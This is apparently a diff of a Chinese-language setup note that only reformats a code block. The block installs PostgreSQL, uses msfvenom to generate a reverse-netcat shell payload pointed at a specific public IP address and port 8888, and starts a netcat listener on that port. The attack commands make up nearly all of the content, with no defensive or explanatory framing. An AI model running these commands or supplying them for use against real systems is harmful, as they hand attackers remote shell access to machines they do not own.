@@ -6,12 +6,12 @@
 
 ubuntu 安装
 --
+````
+apt install postgresql
 
-    apt install postgresql
-    
-    # 生成 payload
-     msfvenom -p cmd/unix/reverse_netcat lhost=118.31.78.77 lport=8888 R     
-    
-    # 监听
-     nc -lvp 8888
-     
+# 生成 payload
+msfvenom -p cmd/unix/reverse_netcat lhost=118.31.78.77 lport=8888 R     
+
+# 监听
+nc -lvp 8888
+````
